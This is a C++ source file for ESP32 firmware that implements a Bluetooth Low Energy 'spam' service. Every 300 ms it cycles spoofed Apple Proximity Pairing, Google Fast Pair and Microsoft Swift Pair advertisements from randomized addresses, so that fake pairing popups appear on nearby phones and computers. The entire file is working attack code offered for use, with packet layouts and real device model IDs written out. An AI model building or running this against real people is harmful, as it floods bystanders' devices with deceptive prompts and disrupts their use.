#include "ble_spam_service.h"

#include <NimBLEDevice.h>
#include <WiFi.h>
#include <cstring>
#include <vector>

namespace {
constexpr unsigned long kCycleIntervalMs = 300;

// Apple Continuity Proximity Pairing (manufacturer ID 0x004C, message type
// 0x07). Field layout cross-verified against the furiousMAC/continuity
// academic write-up and the librepods project -- independent reverse
// engineering, not copied from any AGPL source. Model IDs below are the
// four confirmed by both sources.
constexpr uint16_t kAppleModels[] = {0x0220, 0x0F20, 0x1420, 0x2420};
constexpr size_t kAppleModelCount = sizeof(kAppleModels) / sizeof(kAppleModels[0]);

// Google Fast Pair (Service UUID 0xFE2C, per Google's own official spec).
// These model IDs belong to real, publicly registered devices -- Fast Pair
// is designed so any phone can look up a broadcast model ID, that's the
// whole point of the advertisement.
constexpr uint32_t kFastPairModelIds[] = {0xCD8256, 0xF52494, 0x718FA4};
constexpr size_t kFastPairModelCount =
    sizeof(kFastPairModelIds) / sizeof(kFastPairModelIds[0]);

// Microsoft Swift Pair (Vendor ID 0x0006), per Microsoft's official Swift
// Pair developer documentation (Beacon ID 0x03, sub-scenario 0x00 for
// LE-only pairing, reserved RSSI byte fixed at 0x80).
const char* const kSwiftPairNames[] = {
    "Wireless Mouse",
    "Bluetooth Keyboard",
    "Wireless Headphones",
};
constexpr size_t kSwiftPairNameCount =
    sizeof(kSwiftPairNames) / sizeof(kSwiftPairNames[0]);
}  // namespace

const char* BleSpamService::currentTypeName() const {
    switch (currentConcreteMode_) {
        case BleSpamMode::Apple: return "Apple";
        case BleSpamMode::FastPair: return "Fast Pair";
        case BleSpamMode::SwiftPair: return "Swift Pair";
        default: return "-";
    }
}

bool BleSpamService::begin(BleSpamMode mode) {
    mode_ = mode;
    rotationIndex_ = 0;
    varietyIndex_ = 0;
    packetsSent_ = 0;
    nextCycleMs_ = 0;

    // Both radios share the ESP32-S3 radio resources; mirror the same
    // WiFi-off handoff already used by ble_scanner.cpp before touching BLE.
    WiFi.scanDelete();
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_OFF);
    delay(150);

    if (!initialized_) {
        NimBLEDevice::init("");
        initialized_ = true;
    }
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

    advertising_ = NimBLEDevice::getAdvertising();
    if (advertising_ == nullptr) {
        NimBLEDevice::deinit(true);
        initialized_ = false;
        return false;
    }

    active_ = true;
    broadcastNext();
    return true;
}

void BleSpamService::end() {
    if (advertising_ != nullptr) {
        advertising_->stop();
        // NimBLEDevice::deinit() explicitly calls m_pScan->onHostDeinit()
        // before tearing down the host port, letting an in-progress scan
        // settle first -- but it has no equivalent hook for advertising,
        // it just deletes the NimBLEAdvertising object outright. Since spam
        // mode has been restarting advertising every ~300ms right up until
        // this call, the host task almost always still has the just-issued
        // stop event in flight; deleting the object out from under that
        // reliably panicked on hardware. Give it a moment to drain first.
        delay(50);
        advertising_ = nullptr;
    }
    active_ = false;
    // Fully release NimBLE's controller/memory, same discipline as
    // ble_scanner.cpp -- leaving it initialized crashed a subsequent WiFi
    // scan on hardware during the NimBLE migration.
    if (initialized_) {
        NimBLEDevice::deinit(true);
        initialized_ = false;
    }
}

void BleSpamService::update() {
    if (!active_) return;
    if (millis() < nextCycleMs_) return;
    broadcastNext();
}

BleSpamMode BleSpamService::nextConcreteMode() {
    if (mode_ != BleSpamMode::All) return mode_;
    static constexpr BleSpamMode kRotation[] = {
        BleSpamMode::Apple, BleSpamMode::FastPair, BleSpamMode::SwiftPair,
    };
    const BleSpamMode next = kRotation[rotationIndex_ % 3];
    rotationIndex_++;
    return next;
}

void BleSpamService::randomizeAddress() {
    for (size_t i = 0; i < 5; ++i) {
        currentAddress_[i] = static_cast<uint8_t>(random(256));
    }
    // Static random address: NimBLE's ble_hs_id_set_rnd() (ble_hs_id.c)
    // requires the top two bits of the last byte to be 1s, or it rejects
    // the address outright.
    currentAddress_[5] = static_cast<uint8_t>((random(256) & 0x3F) | 0xC0);
    NimBLEDevice::setOwnAddr(NimBLEAddress(currentAddress_, BLE_ADDR_RANDOM));
}

void BleSpamService::broadcastNext() {
    advertising_->stop();
    randomizeAddress();
    currentConcreteMode_ = nextConcreteMode();

    NimBLEAdvertisementData advData;
    switch (currentConcreteMode_) {
        case BleSpamMode::Apple: {
            uint8_t payload[27];
            payload[0] = 0x4C;
            payload[1] = 0x00;
            payload[2] = 0x07;  // Proximity Pairing message type
            payload[3] = 0x19;  // Length of the following data (25 bytes)
            payload[4] = 0x00;  // Pairing mode (unpaired -> setup popup)
            const uint16_t model = kAppleModels[varietyIndex_ % kAppleModelCount];
            payload[5] = static_cast<uint8_t>(model >> 8);
            payload[6] = static_cast<uint8_t>(model & 0xFF);
            payload[7] = 0x00;   // Status byte
            payload[8] = 0x55;  // Battery (50% left / 50% right)
            payload[9] = 0x00;   // Case battery + charging flags
            payload[10] = 0x01;  // Lid indicator (closed)
            payload[11] = 0x00;  // Device colour (white)
            payload[12] = 0x00;  // Connection state (disconnected)
            for (size_t i = 13; i < sizeof(payload); ++i) {
                payload[i] = static_cast<uint8_t>(random(256));
            }
            advData.setManufacturerData(payload, sizeof(payload));
            break;
        }
        case BleSpamMode::FastPair: {
            const uint32_t modelId =
                kFastPairModelIds[varietyIndex_ % kFastPairModelCount];
            const uint8_t data[3] = {
                static_cast<uint8_t>((modelId >> 16) & 0xFF),
                static_cast<uint8_t>((modelId >> 8) & 0xFF),
                static_cast<uint8_t>(modelId & 0xFF),
            };
            const NimBLEUUID fastPairUuid(static_cast<uint16_t>(0xFE2C));
            advData.setCompleteServices(fastPairUuid);
            advData.setServiceData(fastPairUuid, data, sizeof(data));
            advData.addTxPower();
            break;
        }
        case BleSpamMode::SwiftPair: {
            const char* name = kSwiftPairNames[varietyIndex_ % kSwiftPairNameCount];
            const size_t nameLen = strlen(name);
            std::vector<uint8_t> payload;
            payload.reserve(5 + nameLen);
            payload.push_back(0x06);  // Microsoft Vendor ID (little-endian)
            payload.push_back(0x00);
            payload.push_back(0x03);  // Microsoft Beacon ID: Swift Pair
            payload.push_back(0x00);  // Sub scenario: pairing over BLE only
            payload.push_back(0x80);  // Reserved RSSI byte, per spec
            for (size_t i = 0; i < nameLen; ++i) {
                payload.push_back(static_cast<uint8_t>(name[i]));
            }
            advData.setManufacturerData(payload);
            break;
        }
        default:
            break;
    }

    advertising_->setAdvertisementData(advData);
    advertising_->start();
    ++packetsSent_;
    ++varietyIndex_;
    nextCycleMs_ = millis() + kCycleIntervalMs;
}
